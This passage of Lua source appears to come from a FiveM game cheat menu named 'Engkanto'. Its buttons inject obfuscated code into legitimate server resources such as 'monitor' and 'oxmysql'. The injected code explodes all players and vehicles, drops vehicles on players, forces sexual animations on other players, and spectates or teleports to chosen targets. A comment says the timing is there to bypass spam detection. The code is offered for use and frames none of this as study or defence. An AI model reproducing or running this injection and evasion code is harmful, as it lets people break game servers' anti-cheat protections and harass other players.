            local pOiUyTrEeRwQtYy = DoesEntityExist
            local mNbVcCxZzLlKkJj = GetEntityCoords
            local hGjFkDlSaPwOeIr = AddOwnedExplosion
            local tYuIoPaSdFgHjKl = PlayerPedId

            local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
            for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                    local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                    hGjFkDlSaPwOeIr(
                        tYuIoPaSdFgHjKl(),
                        nMzXcVbNmQwErTy.x,
                        nMzXcVbNmQwErTy.y,
                        nMzXcVbNmQwErTy.z,
                        6,     -- Explosion type
                        1.0,   -- Damage scale
                        true,  -- Audible
                        false, -- Invisible
                        0.0    -- Camera shake
                    )
                end
            end
        end

        fGhJkLpOiUzXcVb()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Explode All Vehicles", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function uYhGtFrEdWsQaZx()
            local rTyUiOpAsDfGhJk = GetGamePool
            local xAsDfGhJkLpOiUz = DoesEntityExist
            local cVbNmQwErTyUiOp = GetEntityCoords
            local vBnMkLoPiUyTrEw = AddOwnedExplosion
            local nMzXcVbNmQwErTy = PlayerPedId

            local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
            local me = nMzXcVbNmQwErTy()
            for _, veh in ipairs(_vehicles) do
                if xAsDfGhJkLpOiUz(veh) then
                    local pos = cVbNmQwErTyUiOp(veh)
                    vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                end
            end
        end
        uYhGtFrEdWsQaZx()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Bring All Nearby Players", function()
    MachoInjectResource("monitor", [[
        local function BringAll()
            TriggerServerEvent('ServerValidEmote', "-1", "danceglowstick", "danceglowstick")
        end
        
        BringAll()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Dance Nearby Players", function()
    MachoInjectResource("monitor", [[
        local function BringAll()
            TriggerServerEvent('ServerValidEmote', "-1", "dance", "dance")
        end
        
        BringAll()
    ]])
end)

MachoMenuButton(ServerTabSections[2], "Cone Everyone", function() 
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
Citizen.CreateThread(function()
    local model = GetHashKey("prop_roadcone02a")
    RequestModel(model) 
    while not HasModelLoaded(model) do 
        Wait(0) 
    end

    local function putCone(ped)
        if not DoesEntityExist(ped) or IsEntityDead(ped) then return end
        local pos = GetEntityCoords(ped)
        local obj = CreateObject(model, pos.x, pos.y, pos.z, true, true, false)
        SetEntityAsMissionEntity(obj, true, true)
        SetEntityCollision(obj, false, false)
        SetEntityInvincible(obj, true)
        SetEntityCanBeDamaged(obj, false)
        local head = GetPedBoneIndex(ped, 31086)
        AttachEntityToEntity(obj, ped, head, 0.0, 0.0, 0.25, 0.0, 0.0, 0.0, 
            false, false, true, false, 2, true)
    end

    putCone(PlayerPedId())

    for _, pid in ipairs(GetActivePlayers()) do
        putCone(GetPlayerPed(pid))
    end

    local peds = GetGamePool and GetGamePool('CPed') or {}
    for _, ped in ipairs(peds) do
        if not IsPedAPlayer(ped) then
            putCone(ped)
        end
    end
]])
end)

MachoMenuButton(ServerTabSections[2], "Tv Everyone", function() 
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
Citizen.CreateThread(function()
    local model = GetHashKey("prop_tv_03")
    RequestModel(model) 
    while not HasModelLoaded(model) do 
        Wait(0) 
    end

    local function putCone(ped)
        if not DoesEntityExist(ped) or IsEntityDead(ped) then return end
        local pos = GetEntityCoords(ped)
        local obj = CreateObject(model, pos.x, pos.y, pos.z, true, true, false)
        SetEntityAsMissionEntity(obj, true, true)
        SetEntityCollision(obj, false, false)
        SetEntityInvincible(obj, true)
        SetEntityCanBeDamaged(obj, false)
        local head = GetPedBoneIndex(ped, 31086)
        AttachEntityToEntity(obj, ped, head, 0.0, 0.0, 0.25, 0.0, 0.0, 0.0, 
            false, false, true, false, 2, true)
    end

    putCone(PlayerPedId())

    for _, pid in ipairs(GetActivePlayers()) do
        putCone(GetPlayerPed(pid))
    end

    local peds = GetGamePool and GetGamePool('CPed') or {}
    for _, ped in ipairs(peds) do
        if not IsPedAPlayer(ped) then
            putCone(ped)
        end
    end
]])
end)



MachoMenuButton(ServerTabSections[2], "Drop Bulldozer Everyone", function()
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function DropBulldozer()
        local modelName = "buldozer"
        local modelHash = GetHashKey(modelName)

        -- Load the model
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end

        local players = GetActivePlayers()
        
        -- We loop through players multiple times to create the "Rain" effect
        for rainWave = 1, 3 do 
            for _, player in ipairs(players) do
                local ped = GetPlayerPed(player)
                
                if DoesEntityExist(ped) and ped ~= PlayerPedId() then
                    local coords = GetEntityCoords(ped)
                    
                    -- Spawn the bulldozer 30 meters above them
                    -- Adding a random X/Y offset so they spread out and collide more
                    local offsetX = math.random(-5, 5)
                    local offsetY = math.random(-5, 5)
                    
                    local veh = CreateVehicle(modelHash, coords.x + offsetX, coords.y + offsetY, coords.z + 30.0, 0.0, true, true)
                    
                    -- Set the vehicle to fall faster
                    SetVehicleForwardSpeed(veh, -10.0)
                end
            end
            -- Small delay between waves to bypass "Instant Spam" detection
            Citizen.Wait(300) 
        end

        SetModelAsNoLongerNeeded(modelHash)
        print("Bulldozer Rain Initiated.")
    end)
]])
end) 

MachoMenuButton(ServerTabSections[2], "Drop Cutter Everyone", function()
        MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function Dropcutter()
        local modelName = "cutter"
        local modelHash = GetHashKey(modelName)

        -- Load the model
        RequestModel(modelHash)
        while not HasModelLoaded(modelHash) do
            Citizen.Wait(0)
        end

        local players = GetActivePlayers()
        
        -- We loop through players multiple times to create the "Rain" effect
        for rainWave = 1, 3 do 
            for _, player in ipairs(players) do
                local ped = GetPlayerPed(player)
                
                if DoesEntityExist(ped) and ped ~= PlayerPedId() then
                    local coords = GetEntityCoords(ped)
                    
                    -- Spawn the bulldozer 30 meters above them
                    -- Adding a random X/Y offset so they spread out and collide more
                    local offsetX = math.random(-5, 5)
                    local offsetY = math.random(-5, 5)
                    
                    local veh = CreateVehicle(modelHash, coords.x + offsetX, coords.y + offsetY, coords.z + 30.0, 0.0, true, true)
                    
                    -- Set the vehicle to fall faster
                    SetVehicleForwardSpeed(veh, -10.0)
                end
            end
            -- Small delay between waves to bypass "Instant Spam" detection
            Citizen.Wait(300) 
        end

        SetModelAsNoLongerNeeded(modelHash)
        print("Cutter Rain Initiated.")
    end)
]])
end) 

MachoMenuText(ServerTabSections[1], "EmoteTrolls")
local EmoteDropDownChoice = 0
local EmoteToggle = false
local EmoteThread = nil

local EmoteMap = {
    [0] = "slapped",
    [1] = "punched",
    [2] = "receiveblowjob",
    [3] = "GiveBlowjob",
    [4] = "headbutted",
    [5] = "hug4",
    [6] = "streetsexfemale",
    [7] = "streetsexmale",
    [8] = "pback2",
    [9] = "carry3",
    [10] = ".....gta298",
    [11] = ".....gta304",
    [12] = ".....gta284"

}

MachoMenuDropDown(ServerTabSections[1], "Emote Choice", function(index)
    EmoteDropDownChoice = index
end,
    "Slapped",
    "Punched",
    "Give BJ",
    "Recieve BJ",
    "Headbutt",
    "Hug",
    "StreetSexFemale",
    "StreetSexMale",
    "Piggyback",
    "Carry",
    "Butt Rape",
    "Amazing Head",
    "Lesbian Scissors"
)

MachoMenuButton(ServerTabSections[1], "Give Emote", function()
    local emote = EmoteMap[EmoteDropDownChoice]
    if emote then
        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or "any", string.format([[
            local function KmTpqXYzLv()
                local Rk3uVnTZpxf7Q = TriggerEvent
                Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
            end

            KmTpqXYzLv()
        ]], emote))
    end
end)

MachoMenuButton(ServerTabSections[1], "Detach All Entitys", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function zXqLJWt7pN()
            local xPvA71LtqzW = ClearPedTasks
            local bXcT2mpqR9f = DetachEntity

            xPvA71LtqzW(PlayerPedId())
            bXcT2mpqR9f(PlayerPedId())
        end

        zXqLJWt7pN()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Twerk On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function OyWTpKvmXq()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                        RequestAnimDict("switch@trevor@mocks_lapdance")
                        while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                            Wait(0)
                        end        
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        OyWTpKvmXq()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Give Them Backshots", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function bXzLqPTMn9()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkDaddy then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkDaddy = false
                else
                    StarkDaddy = true
                    if not HasAnimDictLoaded("rcmpaparazzo_2") then
                        RequestAnimDict("rcmpaparazzo_2")
                        while not HasAnimDictLoaded("rcmpaparazzo_2") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                end
            end
        end

        bXzLqPTMn9()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Wank On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qXW7YpLtKv()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    wankoffperson = false
                else
                    wankoffperson = true
                    if not HasAnimDictLoaded("mp_player_int_upperwank") then
                        RequestAnimDict("mp_player_int_upperwank")
                        while not HasAnimDictLoaded("mp_player_int_upperwank") do
                            Wait(0)
                        end
                    end
                end

                TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
            end
        end

        qXW7YpLtKv()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Piggyback On Player", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function RtKpqLmXZV()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if isInPiggyBack then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    isInPiggyBack = false
                else
                    isInPiggyBack = true
                    if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                        RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                        while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                end
            end
        end

        RtKpqLmXZV()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Blame Arrest", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function WXY7LpqKto()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCuff then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCuff = false
                else
                    StarkCuff = true
                    if not HasAnimDictLoaded("mp_arresting") then
                        RequestAnimDict("mp_arresting")
                        while not HasAnimDictLoaded("mp_arresting") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                end
            end
        end

        WXY7LpqKto()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Blame Carry", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function KmXYpTzqLW()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if StarkCarry then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    StarkCarry = false
                else
                    StarkCarry = true
                    if not HasAnimDictLoaded("nm") then
                        RequestAnimDict("nm")
                        while not HasAnimDictLoaded("nm") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        KmXYpTzqLW()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Sit On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function PxKvqLtNYz()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        PxKvqLtNYz()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Ride Driver", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function vZqPWLXm97()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if RideDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    RideDriver = false
                else
                    RideDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    local targetPed = GetPlayerPed(closestPlayer)
                    AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        vZqPWLXm97()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Blow Driver", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function qPLWtXYzKm()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if closestPlayer then
                if BlowDriver then
                    ClearPedSecondaryTask(playerPed)
                    DetachEntity(playerPed, true, false)
                    BlowDriver = false
                else
                    BlowDriver = true
                    if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                        RequestAnimDict("mini@prostitutes@sexnorm_veh")
                        while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                            Wait(0)
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                end
            end
        end

        qPLWtXYzKm()
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Meditate On Them", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function XYqLvTzWKo()
            local closestPlayer, closestDistance = nil, math.huge
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)

            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)

                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end

            if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                RequestAnimDict("rcmcollect_paperleadinout@")
                while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                    Wait(0)
                end
            end

            AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
            TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
            TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
        end

        XYqLvTzWKo()
    ]])
end)

MachoMenuText(ServerTabSections[1], "Other")
local AdminTargetInput = MachoMenuInputbox(ServerTabSections[1], "Server ID", "Input Player ID Here")

local isSpectating = false
local spectateOldCoords = nil
MachoMenuCheckbox(ServerTabSections[1], "Spectate Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetId))
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Engkanto", "Player not found.")
        return
    end
    isSpectating = true
    spectateOldCoords = GetEntityCoords(PlayerPedId())
    NetworkRequestControlOfEntity(targetPed)
    SetEntityCoordsNoOffset(PlayerPedId(), GetEntityCoords(targetPed), false, false, false)
    MachoInjectResource('monitor', string.format([[
        CreateThread(function()
            while _G.isSpectating do
                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                if DoesEntityExist(targetPed) then
                    local coords = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, false, false, false)
                end
                Wait(0)
            end
        end)
    ]], targetId))
    MachoMenuNotification("Engkanto", "Spectating player ID: " .. targetId)
end, function()
    isSpectating = false
    MachoInjectResource('monitor', [[_G.isSpectating = false]])
    if spectateOldCoords then
        SetEntityCoordsNoOffset(PlayerPedId(), spectateOldCoords.x, spectateOldCoords.y, spectateOldCoords.z, false, false, false)
    end
    MachoMenuNotification("Engkanto", "Spectate stopped.")
end)

MachoMenuButton(ServerTabSections[1], "Get Information", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    local ped = GetPlayerPed(playerId)
    local coords = GetEntityCoords(ped)
    local name = GetPlayerName(playerId)
    local health = GetEntityHealth(ped)
    local armor = GetPedArmour(ped)
    local ping = GetPlayerPed(playerId) and GetPlayerPing and GetPlayerPing(playerId) or 0
    MachoMenuNotification("Engkanto",
        "Name: " .. name ..
        " | ID: " .. targetId ..
        " | HP: " .. health ..
        " | Armor: " .. armor ..
        " | X:" .. math.floor(coords.x) ..
        " Y:" .. math.floor(coords.y) ..
        " Z:" .. math.floor(coords.z)
    )
end)

MachoMenuButton(ServerTabSections[1], "Revive Player (ESX)", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    TriggerServerEvent('osp_ambulance:partialReviveSv', targetId)
    MachoMenuNotification("Engkanto", "Revive sent to ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Revive Player 2 (ESX)", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    TriggerServerEvent("hospital:server:RevivePlayer", targetId)
    MachoMenuNotification("Engkanto", "Revive 2 sent to ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Give Player No Headshot", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    MachoInjectResource('monitor', string.format([[
        local ped = GetPlayerPed(GetPlayerFromServerId(%d))
        if DoesEntityExist(ped) then
            SetPedSuffersCriticalHits(ped, false)
        end
    ]], targetId))
    MachoMenuNotification("Engkanto", "Applied to ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Teleport To Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    local targetPed = GetPlayerPed(playerId)
    local coords = GetEntityCoords(targetPed)
    SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, false, false, false)
    MachoMenuNotification("Engkanto", "Teleported to player ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Teleport To Player Vehicle", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    local targetPed = GetPlayerPed(playerId)
    local veh = GetVehiclePedIsIn(targetPed, false)
    if veh == 0 then
        MachoMenuNotification("Engkanto", "Target is not in a vehicle!")
        return
    end
    local coords = GetEntityCoords(veh)
    SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, false, false, false)
    MachoMenuNotification("Engkanto", "Teleported to player's vehicle.")
end)

MachoMenuButton(ServerTabSections[1], "Heal Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    MachoInjectResource('monitor', string.format([[
        local ped = GetPlayerPed(GetPlayerFromServerId(%d))
        if DoesEntityExist(ped) then
            local coords = GetEntityCoords(ped)
            SetEntityHealth(ped, 200)
            local healHash = GetHashKey("prop_ped_med_bag_01")
            RequestModel(healHash)
            while not HasModelLoaded(healHash) do Wait(0) end
            local obj = CreateObject(healHash, coords.x + 0.5, coords.y + 0.5, coords.z, true, true, true)
            PlaceObjectOnGroundProperly(obj)
            SetEntityAsMissionEntity(obj, true, true)
            SetModelAsNoLongerNeeded(healHash)
        end
    ]], targetId))
    MachoMenuNotification("Engkanto", "Healed player ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Armor Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    MachoInjectResource('monitor', string.format([[
        local ped = GetPlayerPed(GetPlayerFromServerId(%d))
        if DoesEntityExist(ped) then
            local coords = GetEntityCoords(ped)
            SetPedArmour(ped, 100)
            NetworkRequestControlOfEntity(ped)
            Citizen.Wait(100)
            SetPedArmour(ped, 100)
            local vestHash = GetHashKey("prop_armour_pickup_01")
            RequestModel(vestHash)
            while not HasModelLoaded(vestHash) do Wait(0) end
            local obj = CreateObject(vestHash, coords.x - 0.5, coords.y + 0.5, coords.z, true, true, true)
            PlaceObjectOnGroundProperly(obj)
            SetEntityAsMissionEntity(obj, true, true)
            SetModelAsNoLongerNeeded(vestHash)
        end
    ]], targetId))
    TriggerServerEvent('esx_basicneeds:addArmour', 100)
    MachoMenuNotification("Engkanto", "Armor applied to ID: " .. targetId)
end)

local copiedCoords = nil
local copiedHeading = nil
MachoMenuButton(ServerTabSections[1], "Copy Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
